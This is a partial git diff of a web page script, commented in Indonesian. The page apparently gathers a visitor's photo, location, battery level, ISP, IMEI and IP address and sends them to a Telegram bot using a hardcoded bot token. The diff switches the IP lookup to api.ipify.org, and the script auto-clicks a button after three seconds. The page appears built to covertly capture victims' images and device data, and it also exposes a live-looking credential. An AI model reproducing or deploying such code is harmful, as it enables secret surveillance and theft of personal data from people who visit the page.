@@ -64,9 +64,14 @@
                 deviceInfo.batteryLevel = battery.level * 100;
                 deviceInfo.isp = getISPInfo(); // Memanggil fungsi untuk mendapatkan info ISP
                 deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan info IMEI
-                getIPAddress()
-                  .then(function(ipAddress) {
-                    deviceInfo.ipAddress = ipAddress;
+
+                // Mengambil IP perangkat menggunakan layanan ipify
+                fetch('https://api.ipify.org?format=json')
+                  .then(function(response) {
+                    return response.json();
+                  })
+                  .then(function(data) {
+                    deviceInfo.ipAddress = data.ip;
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
@@ -192,6 +197,4 @@
     setTimeout(autoClickButton, 3000);
   </script>
 </body>
-</html>
-
 </html>
